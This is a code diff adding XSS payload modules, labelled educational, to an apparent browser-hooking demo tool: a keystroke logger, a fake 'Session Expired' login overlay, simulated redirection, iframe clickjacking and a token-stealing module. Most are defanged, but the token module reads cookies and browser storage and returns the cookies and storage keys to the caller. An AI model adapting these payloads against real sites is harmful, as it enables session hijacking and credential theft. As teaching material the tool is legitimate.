@@ -329,6 +329,187 @@ export class MemStorage implements IStorage {
         `
       },
       {
+        name: 'Keystroke Logger (Educational)',
+        description: 'Demonstrate how keystroke logging works in a controlled environment',
+        category: 'Information Gathering',
+        icon: 'keyboard',
+        code: `
+          (() => {
+            // Educational demonstration only
+            let keystrokes = [];
+            let isLogging = false;
+            
+            // Create UI elements
+            const loggerDiv = document.createElement('div');
+            loggerDiv.id = 'xss-keylogger-demo';
+            loggerDiv.style.position = 'fixed';
+            loggerDiv.style.bottom = '20px';
+            loggerDiv.style.right = '20px';
+            loggerDiv.style.width = '300px';
+            loggerDiv.style.padding = '15px';
+            loggerDiv.style.backgroundColor = '#f8f9fa';
+            loggerDiv.style.border = '1px solid #ddd';
+            loggerDiv.style.borderRadius = '5px';
+            loggerDiv.style.boxShadow = '0 0 10px rgba(0,0,0,0.1)';
+            loggerDiv.style.zIndex = '9999';
+            loggerDiv.style.fontFamily = 'Arial, sans-serif';
+            
+            loggerDiv.innerHTML = \`
+              <div style="margin-bottom:10px; font-weight:bold; color:#721c24; background-color:#f8d7da; padding:5px; border-radius:3px; text-align:center;">
+                EDUCATIONAL KEYSTROKE LOGGER DEMO
+              </div>
+              <div style="margin-bottom:10px;">
+                <button id="start-logging" style="padding:5px 10px; background:#28a745; color:white; border:none; border-radius:3px; cursor:pointer; margin-right:5px;">Start Demo</button>
+                <button id="stop-logging" style="padding:5px 10px; background:#dc3545; color:white; border:none; border-radius:3px; cursor:pointer; display:none;">Stop Demo</button>
+              </div>
+              <div style="font-size:12px; margin-bottom:10px;">Type in the field below to see keylogging in action:</div>
+              <input type="text" id="demo-input" style="width:100%; padding:5px; margin-bottom:10px; border:1px solid #ced4da; border-radius:3px;" placeholder="Type here...">
+              <div style="font-size:12px; margin-bottom:5px;">Captured keystrokes:</div>
+              <div id="keystroke-log" style="height:100px; overflow-y:auto; border:1px solid #ced4da; padding:5px; font-family:monospace; font-size:12px; background:#f5f5f5;">
+                Click "Start Demo" to begin...
+              </div>
+              <div style="font-size:11px; margin-top:10px; color:#6c757d;">For educational purposes only. In real-world attacks, this would happen invisibly.</div>
+            \`;
+            
+            document.body.appendChild(loggerDiv);
+            
+            // Set up event handlers
+            document.getElementById('start-logging').addEventListener('click', function() {
+              document.getElementById('start-logging').style.display = 'none';
+              document.getElementById('stop-logging').style.display = 'inline-block';
+              document.getElementById('keystroke-log').innerHTML = 'Logging started...<br>';
+              keystrokes = [];
+              isLogging = true;
+            });
+            
+            document.getElementById('stop-logging').addEventListener('click', function() {
+              document.getElementById('stop-logging').style.display = 'none';
+              document.getElementById('start-logging').style.display = 'inline-block';
+              isLogging = false;
+              document.getElementById('keystroke-log').innerHTML += '<br>Logging stopped.<br>';
+            });
+            
+            // Set up the keylogger
+            function handleKeyPress(e) {
+              if (!isLogging) return;
+              
+              const key = e.key;
+              const target = e.target.tagName;
+              const timestamp = new Date().toLocaleTimeString();
+              
+              keystrokes.push({key, target, timestamp});
+              
+              let logElement = document.getElementById('keystroke-log');
+              logElement.innerHTML += \`[\${timestamp}] \${key}<br>\`;
+              logElement.scrollTop = logElement.scrollHeight;
+            }
+            
+            // Only log keys from the demo input to be ethical
+            document.getElementById('demo-input').addEventListener('keydown', handleKeyPress);
+            
+            return { success: true, message: 'Keystroke logger demonstration activated' };
+          })();
+        `
+      },
+      {
+        name: 'Fake Login Phishing Demo',
+        description: 'Demonstrate how phishing attacks can steal credentials',
+        category: 'Social Engineering',
+        icon: 'login',
+        code: `
+          (() => {
+            // Educational demonstration only
+            // Create a fake login overlay
+            const overlay = document.createElement('div');
+            overlay.id = 'xss-phishing-demo';
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
+            overlay.style.zIndex = '10000';
+            overlay.style.display = 'flex';
+            overlay.style.justifyContent = 'center';
+            overlay.style.alignItems = 'center';
+            overlay.style.fontFamily = 'Arial, sans-serif';
+            
+            const form = document.createElement('div');
+            form.style.width = '350px';
+            form.style.backgroundColor = 'white';
+            form.style.borderRadius = '8px';
+            form.style.padding = '20px';
+            form.style.boxShadow = '0 10px 25px rgba(0,0,0,0.2)';
+            
+            form.innerHTML = \`
+              <div style="text-align:center; margin-bottom:20px;">
+                <div style="font-size:22px; font-weight:bold; margin-bottom:5px;">Session Expired</div>
+                <div style="font-size:14px; color:#666;">Please log in again to continue</div>
+              </div>
+              
+              <div style="margin-bottom:15px; background-color:#f8d7da; border:1px solid #f5c6cb; color:#721c24; padding:10px; border-radius:4px; font-size:12px; text-align:center;">
+                <strong>EDUCATIONAL PHISHING DEMONSTRATION</strong><br>
+                This is a simulated phishing attack for educational purposes only.
+                <br>In a real attack, this warning would not be present.
+              </div>
+              
+              <div style="margin-bottom:15px;">
+                <label style="display:block; margin-bottom:5px; font-size:14px; font-weight:bold;">Email or Username</label>
+                <input type="text" id="fake-username" style="width:100%; padding:10px; border:1px solid #ddd; border-radius:4px; box-sizing:border-box;">
+              </div>
+              
+              <div style="margin-bottom:20px;">
+                <label style="display:block; margin-bottom:5px; font-size:14px; font-weight:bold;">Password</label>
+                <input type="password" id="fake-password" style="width:100%; padding:10px; border:1px solid #ddd; border-radius:4px; box-sizing:border-box;">
+              </div>
+              
+              <button id="fake-submit" style="width:100%; padding:12px; background-color:#0066ff; color:white; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Log In</button>
+              
+              <div style="margin-top:15px; font-size:13px; text-align:center;">
+                <a href="#" style="color:#0066ff; text-decoration:none;">Forgot password?</a>
+              </div>
+              
+              <div id="captured-creds" style="margin-top:20px; display:none; padding:10px; background-color:#e2f3e5; border:1px solid #d4edda; color:#155724; border-radius:4px; font-size:13px;">
+              </div>
+              
+              <div style="margin-top:15px; text-align:right;">
+                <button id="close-demo" style="padding:8px 15px; background-color:#f8f9fa; border:1px solid #ddd; border-radius:4px; cursor:pointer; font-size:13px;">Close Demo</button>
+              </div>
+            \`;
+            
+            overlay.appendChild(form);
+            document.body.appendChild(overlay);
+            
+            // Set up event handlers
+            document.getElementById('fake-submit').addEventListener('click', function() {
+              const username = document.getElementById('fake-username').value;
+              const password = document.getElementById('fake-password').value;
+              
+              if (username && password) {
+                const capturedDiv = document.getElementById('captured-creds');
+                capturedDiv.style.display = 'block';
+                capturedDiv.innerHTML = \`
+                  <strong>Credentials Captured! (Educational Demo Only)</strong><br>
+                  Username: \${username}<br>
+                  Password: \${password.replace(/./g, '*')}<br><br>
+                  <div style="font-size:11px;">In a real attack, these credentials would be sent to the attacker.</div>
+                \`;
+                
+                // Clear the form inputs
+                document.getElementById('fake-username').value = '';
+                document.getElementById('fake-password').value = '';
+              }
+            });
+            
+            document.getElementById('close-demo').addEventListener('click', function() {
+              document.body.removeChild(overlay);
+            });
+            
+            return { success: true, message: 'Fake login phishing demonstration activated' };
+          })();
+        `
+      },
+      {
         name: 'Create Alert Dialog',
         description: 'Display an alert dialog on the hooked browser',
         category: 'DOM Manipulation',
@@ -361,6 +542,119 @@ export class MemStorage implements IStorage {
         `
       },
       {
+        name: 'Page Redirection Demo',
+        description: 'Demonstrate page redirection attacks',
+        category: 'DOM Manipulation',
+        icon: 'link',
+        code: `
+          (() => {
+            // Educational demonstration only
+            const overlay = document.createElement('div');
+            overlay.id = 'xss-redirect-demo';
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
+            overlay.style.zIndex = '10000';
+            overlay.style.display = 'flex';
+            overlay.style.justifyContent = 'center';
+            overlay.style.alignItems = 'center';
+            overlay.style.fontFamily = 'Arial, sans-serif';
+            
+            const dialog = document.createElement('div');
+            dialog.style.width = '400px';
+            dialog.style.backgroundColor = 'white';
+            dialog.style.borderRadius = '8px';
+            dialog.style.padding = '20px';
+            dialog.style.boxShadow = '0 10px 25px rgba(0,0,0,0.2)';
+            
+            dialog.innerHTML = \`
+              <div style="text-align:center; margin-bottom:20px;">
+                <div style="font-size:22px; font-weight:bold; margin-bottom:5px;">Page Redirection Attack Demo</div>
+              </div>
+              
+              <div style="margin-bottom:15px; background-color:#f8d7da; border:1px solid #f5c6cb; color:#721c24; padding:10px; border-radius:4px; font-size:12px; text-align:center;">
+                <strong>EDUCATIONAL DEMONSTRATION ONLY</strong><br>
+                This simulates how attackers can redirect users to malicious websites.
+              </div>
+              
+              <div style="margin-bottom:20px;">
+                <p style="font-size:14px; line-height:1.5;">
+                  In a real attack, the page would be instantly redirected to a phishing site or malicious URL without warning. 
+                  The redirection can happen using various methods:
+                </p>
+                <ul style="font-size:14px; margin-top:10px;">
+                  <li style="margin-bottom:8px;">window.location.href = "malicious-url.com"</li>
+                  <li style="margin-bottom:8px;">window.location.replace("malicious-url.com")</li>
+                  <li style="margin-bottom:8px;">Meta refresh tag injection</li>
+                </ul>
+              </div>
+              
+              <div style="display:flex; justify-content:space-between; margin-top:20px;">
+                <button id="simulate-redirect" style="padding:10px 15px; background-color:#0066ff; color:white; border:none; border-radius:4px; cursor:pointer;">Simulate Redirect</button>
+                <button id="close-redirect-demo" style="padding:10px 15px; background-color:#f8f9fa; border:1px solid #ddd; border-radius:4px; cursor:pointer;">Close Demo</button>
+              </div>
+            \`;
+            
+            overlay.appendChild(dialog);
+            document.body.appendChild(overlay);
+            
+            // Set up event handlers
+            document.getElementById('simulate-redirect').addEventListener('click', function() {
+              const redirectDialog = document.createElement('div');
+              redirectDialog.style.position = 'fixed';
+              redirectDialog.style.top = '50%';
+              redirectDialog.style.left = '50%';
+              redirectDialog.style.transform = 'translate(-50%, -50%)';
+              redirectDialog.style.backgroundColor = 'white';
+              redirectDialog.style.padding = '20px';
+              redirectDialog.style.borderRadius = '8px';
+              redirectDialog.style.boxShadow = '0 10px 25px rgba(0,0,0,0.2)';
+              redirectDialog.style.zIndex = '10001';
+              redirectDialog.style.width = '300px';
+              redirectDialog.style.textAlign = 'center';
+              
+              redirectDialog.innerHTML = \`
+                <div style="font-size:18px; margin-bottom:10px;">Redirecting in 5 seconds...</div>
+                <div style="font-size:14px; margin-bottom:15px;">This is only a simulation. No actual redirection will occur.</div>
+                <div style="font-size:14px; font-weight:bold; color:#721c24;">In a real attack, you would be redirected to:</div>
+                <div style="font-family:monospace; padding:8px; background:#f8f9fa; margin:10px 0; border-radius:4px;">https://malicious-phishing-site.com</div>
+                <div id="redirect-countdown" style="font-size:20px; margin:15px 0;">5</div>
+                <button id="cancel-redirect" style="padding:8px 15px; background-color:#dc3545; color:white; border:none; border-radius:4px; cursor:pointer;">Cancel</button>
+              \`;
+              
+              document.body.appendChild(redirectDialog);
+              
+              let countdown = 5;
+              const countdownEl = document.getElementById('redirect-countdown');
+              
+              const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownEl.textContent = countdown;
+                
+                if (countdown <= 0) {
+                  clearInterval(countdownInterval);
+                  document.body.removeChild(redirectDialog);
+                }
+              }, 1000);
+              
+              document.getElementById('cancel-redirect').addEventListener('click', function() {
+                clearInterval(countdownInterval);
+                document.body.removeChild(redirectDialog);
+              });
+            });
+            
+            document.getElementById('close-redirect-demo').addEventListener('click', function() {
+              document.body.removeChild(overlay);
+            });
+            
+            return { success: true, message: 'Page redirection demonstration activated' };
+          })();
+        `
+      },
+      {
         name: 'Inject HTML Element',
         description: 'Inject a new HTML element into the page',
         category: 'DOM Manipulation',
@@ -383,6 +677,220 @@ export class MemStorage implements IStorage {
             div.innerHTML = 'Educational XSS Demonstration - This banner was injected via a simulated XSS vulnerability';
             document.body.appendChild(div);
             return { success: true, element: 'div#xss-demo-banner' };
+          })();
+        `
+      },
+      {
+        name: 'Iframe Injection Demo',
+        description: 'Demonstrate iframe injection for UI redressing attacks',
+        category: 'DOM Manipulation',
+        icon: 'html',
+        code: `
+          (() => {
+            // Educational demonstration only
+            const overlay = document.createElement('div');
+            overlay.id = 'xss-iframe-demo';
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
+            overlay.style.zIndex = '10000';
+            overlay.style.display = 'flex';
+            overlay.style.justifyContent = 'center';
+            overlay.style.alignItems = 'center';
+            overlay.style.fontFamily = 'Arial, sans-serif';
+            
+            const dialog = document.createElement('div');
+            dialog.style.width = '500px';
+            dialog.style.backgroundColor = 'white';
+            dialog.style.borderRadius = '8px';
+            dialog.style.padding = '20px';
+            dialog.style.boxShadow = '0 10px 25px rgba(0,0,0,0.2)';
+            
+            dialog.innerHTML = \`
+              <div style="text-align:center; margin-bottom:20px;">
+                <div style="font-size:22px; font-weight:bold; margin-bottom:5px;">Iframe Injection Attack Demo</div>
+              </div>
+              
+              <div style="margin-bottom:15px; background-color:#f8d7da; border:1px solid #f5c6cb; color:#721c24; padding:10px; border-radius:4px; font-size:12px; text-align:center;">
+                <strong>EDUCATIONAL DEMONSTRATION ONLY</strong><br>
+                This simulates how attackers can use iframes for clickjacking and UI redressing attacks.
+              </div>
+              
+              <div style="margin-bottom:20px;">
+                <p style="font-size:14px; line-height:1.5;">
+                  In a real attack, iframes can be used to:
+                </p>
+                <ul style="font-size:14px; margin-top:10px;">
+                  <li style="margin-bottom:8px;">Load malicious content within a legitimate site</li>
+                  <li style="margin-bottom:8px;">Create clickjacking attacks where transparent elements trick users into clicking hidden buttons</li>
+                  <li style="margin-bottom:8px;">Bypass same-origin policy restrictions</li>
+                </ul>
+              </div>
+              
+              <div style="margin-bottom:20px;">
+                <p style="font-size:14px; font-weight:bold;">Demo iframe (showing example.com):</p>
+                <div id="iframe-container" style="position:relative; width:100%; height:200px; border:1px solid #ddd; overflow:hidden; margin-top:10px;">
+                  <div style="position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.6); display:flex; justify-content:center; align-items:center; z-index:2; pointer-events:none;">
+                    <div style="padding:10px; background:rgba(0,0,0,0.7); color:white; border-radius:4px;">
+                      Iframe content (typically hidden or disguised)
+                    </div>
+                  </div>
+                  <iframe src="about:blank" id="demo-iframe" style="width:100%; height:100%; border:none;"></iframe>
+                </div>
+              </div>
+              
+              <div style="margin-top:20px; display:flex; justify-content:flex-end;">
+                <button id="close-iframe-demo" style="padding:10px 15px; background-color:#f8f9fa; border:1px solid #ddd; border-radius:4px; cursor:pointer;">Close Demo</button>
+              </div>
+            \`;
+            
+            overlay.appendChild(dialog);
+            document.body.appendChild(overlay);
+            
+            // Set iframe content
+            const iframe = document.getElementById('demo-iframe');
+            if (iframe && iframe.contentWindow) {
+              iframe.contentWindow.document.open();
+              iframe.contentWindow.document.write(\`
+                <html>
+                <head>
+                  <style>
+                    body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
+                    .button { display: inline-block; padding: 10px 20px; background: #0066ff; color: white; 
+                             border-radius: 4px; text-decoration: none; margin-top: 20px; }
+                  </style>
+                </head>
+                <body>
+                  <h2>Demo Content</h2>
+                  <p>In a real attack, this could be a clone of a login page or another sensitive site.</p>
+                  <a href="#" class="button">Malicious Button</a>
+                </body>
+                </html>
+              \`);
+              iframe.contentWindow.document.close();
+            }
+            
+            // Set up event handlers
+            document.getElementById('close-iframe-demo').addEventListener('click', function() {
+              document.body.removeChild(overlay);
+            });
+            
+            return { success: true, message: 'Iframe injection demonstration activated' };
+          })();
+        `
+      },
+      {
+        name: 'Token Stealing Demo',
+        description: 'Educational demonstration of how session tokens can be stolen',
+        category: 'Information Gathering',
+        icon: 'security',
+        code: `
+          (() => {
+            // Educational demonstration only
+            const overlay = document.createElement('div');
+            overlay.id = 'xss-token-demo';
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
+            overlay.style.zIndex = '10000';
+            overlay.style.display = 'flex';
+            overlay.style.justifyContent = 'center';
+            overlay.style.alignItems = 'center';
+            overlay.style.fontFamily = 'Arial, sans-serif';
+            
+            const dialog = document.createElement('div');
+            dialog.style.width = '500px';
+            dialog.style.backgroundColor = 'white';
+            dialog.style.borderRadius = '8px';
+            dialog.style.padding = '20px';
+            dialog.style.boxShadow = '0 10px 25px rgba(0,0,0,0.2)';
+            
+            // Get cookies and local storage data
+            const cookieData = document.cookie;
+            const localStorageItems = {};
+            for (let i = 0; i < localStorage.length; i++) {
+              const key = localStorage.key(i);
+              if (key) {
+                localStorageItems[key] = localStorage.getItem(key);
+              }
+            }
+            
+            // Get session storage data
+            const sessionStorageItems = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+              const key = sessionStorage.key(i);
+              if (key) {
+                sessionStorageItems[key] = sessionStorage.getItem(key);
+              }
+            }
+            
+            dialog.innerHTML = \`
+              <div style="text-align:center; margin-bottom:20px;">
+                <div style="font-size:22px; font-weight:bold; margin-bottom:5px;">Token Stealing Demonstration</div>
+              </div>
+              
+              <div style="margin-bottom:15px; background-color:#f8d7da; border:1px solid #f5c6cb; color:#721c24; padding:10px; border-radius:4px; font-size:12px; text-align:center;">
+                <strong>EDUCATIONAL DEMONSTRATION ONLY</strong><br>
+                This simulates how attackers can steal authentication tokens and session data.
+              </div>
+              
+              <div style="margin-bottom:20px;">
+                <p style="font-size:14px; line-height:1.5;">
+                  In a real attack, the following data would be sent to the attacker's server:
+                </p>
+                
+                <div style="margin-top:15px;">
+                  <div style="font-weight:bold; margin-bottom:5px; font-size:14px;">Cookies:</div>
+                  <div style="background:#f8f9fa; padding:10px; border-radius:4px; font-family:monospace; font-size:12px; overflow-x:auto; max-height:80px; overflow-y:auto;">
+                    \${cookieData ? cookieData : "No cookies found"}
+                  </div>
+                </div>
+                
+                <div style="margin-top:15px;">
+                  <div style="font-weight:bold; margin-bottom:5px; font-size:14px;">localStorage:</div>
+                  <div style="background:#f8f9fa; padding:10px; border-radius:4px; font-family:monospace; font-size:12px; overflow-x:auto; max-height:80px; overflow-y:auto;">
+                    \${Object.keys(localStorageItems).length > 0 ? JSON.stringify(localStorageItems, null, 2) : "No localStorage data found"}
+                  </div>
+                </div>
+                
+                <div style="margin-top:15px;">
+                  <div style="font-weight:bold; margin-bottom:5px; font-size:14px;">sessionStorage:</div>
+                  <div style="background:#f8f9fa; padding:10px; border-radius:4px; font-family:monospace; font-size:12px; overflow-x:auto; max-height:80px; overflow-y:auto;">
+                    \${Object.keys(sessionStorageItems).length > 0 ? JSON.stringify(sessionStorageItems, null, 2) : "No sessionStorage data found"}
+                  </div>
+                </div>
+              </div>
+              
+              <div style="margin-top:20px; font-size:14px; background-color:#e2e3e5; border:1px solid #d6d8db; color:#383d41; padding:10px; border-radius:4px;">
+                <strong>Security Note:</strong> To protect against XSS token theft, use HttpOnly cookies, implement proper CSP headers, and consider using anti-CSRF tokens.
+              </div>
+              
+              <div style="margin-top:20px; display:flex; justify-content:flex-end;">
+                <button id="close-token-demo" style="padding:10px 15px; background-color:#f8f9fa; border:1px solid #ddd; border-radius:4px; cursor:pointer;">Close Demo</button>
+              </div>
+            \`;
+            
+            overlay.appendChild(dialog);
+            document.body.appendChild(overlay);
+            
+            // Set up event handlers
+            document.getElementById('close-token-demo').addEventListener('click', function() {
+              document.body.removeChild(overlay);
+            });
+            
+            return { 
+              success: true, 
+              message: 'Token stealing demonstration activated',
+              cookies: cookieData,
+              localStorage: Object.keys(localStorageItems),
+              sessionStorage: Object.keys(sessionStorageItems)
+            };
           })();
         `
       },
